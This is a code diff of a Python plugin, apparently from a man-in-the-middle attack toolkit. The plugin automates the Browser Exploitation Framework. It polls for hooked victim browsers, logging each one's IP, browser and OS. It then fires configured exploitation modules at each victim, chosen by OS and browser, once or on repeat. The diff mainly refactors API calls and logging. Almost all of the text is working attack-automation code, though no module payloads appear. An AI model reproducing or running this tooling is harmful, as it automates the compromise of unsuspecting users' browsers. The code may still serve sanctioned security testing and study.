@@ -37,54 +37,51 @@ class BeefAutorun(Plugin):
 
 		userconfig = ConfigObj(self.autoruncfg)
 		self.Mode = userconfig['mode']
-		if self.Mode == 'oneshot':
-			print '[*] Setting mode to oneshot'
-		elif self.Mode == 'loop':
-			print '[*] Setting mode to loop'
-		else:
-			sys.exit("[-] Error: unrecognized mode set in config file")
 
 		self.All_modules = userconfig["ALL"]
 		self.Targeted_modules = userconfig["targets"]
 
-		print "[*] BeEFAutorun plugin online"
+		print "[*] BeEFAutorun plugin online => Mode: %s" % self.Mode
 		t = threading.Thread(name="autorun", target=self.autorun, args=(beef,))
 		t.setDaemon(True)
 		t.start()
 
 	def autorun(self, beef):
-		already_hooked = []
 		already_ran = []
+		already_hooked = []
 		while True:
-			sessions = beef.onlineSessions()
+			sessions = beef.sessions_online()
 			if len(sessions) > 0:
 				for session in sessions:
-					session_ip = beef.session2host(session)
+
 					if session not in already_hooked:
-						logging.info("%s >> joined the horde!" % session_ip)
+						info = beef.hook_info(session)
+						logging.info("%s >> joined the horde! [id:%s, type:%s-%s, os:%s]" % (info['ip'], info['id'], info['name'], info['version'], info['os']))
 						already_hooked.append(session)
 
 					if self.Mode == 'oneshot':
 						if session not in already_ran:
-							self.execModules(session, session_ip, beef)
+							self.execModules(session, beef)
 							already_ran.append(session)
 
 					elif self.Mode == 'loop':
-						self.execModules(session, session_ip, beef)
+						self.execModules(session, beef)
 						sleep(10)
 
 			else:
 				sleep(1)
 
-	def execModules(self, session, session_ip, beef):
-		session_browser = beef.sessionInfo(session)["BrowserName"]
-		session_os = beef.sessionInfo(session)["OsName"]
+	def execModules(self, session, beef):
+		session_info = beef.hook_info(session)
+		session_ip = session_info['ip']
+		hook_browser = session_info['name']
+		hook_os = session_info['os']
 
 		if len(self.All_modules) > 0:
 			logging.info("%s >> sending generic modules" % session_ip)
 			for module, options in self.All_modules.items():
-				mod_id = beef.getModid(module)
-				resp = beef.runModule(session, mod_id, json.loads(options))
+				mod_id = beef.module_id(module)
+				resp = beef.module_run(session, mod_id, json.loads(options))
 				if resp["success"] == 'true':
 					logging.info('%s >> sent module %s' % (session_ip, mod_id))
 				else:
@@ -93,16 +90,16 @@ class BeefAutorun(Plugin):
 
 		logging.info("%s >> sending targeted modules" % session_ip)
 		for os in self.Targeted_modules:
-			if (os in session_os) or (os == session_os):
+			if (os in hook_os) or (os == hook_os):
 				browsers = self.Targeted_modules[os]
 				if len(browsers) > 0:
 					for browser in browsers:
-						if browser == session_browser:
+						if browser == hook_browser:
 							modules = self.Targeted_modules[os][browser]
 							if len(modules) > 0:
 								for module, options in modules.items():
-									mod_id = beef.getModid(module)
-									resp = beef.runModule(session, mod_id, json.loads(options))
+									mod_id = beef.module_id(module)
+									resp = beef.module_run(session, mod_id, json.loads(options))
 									if resp["success"] == 'true':
 										logging.info('%s >> sent module %s' % (session_ip, mod_id))
 									else:
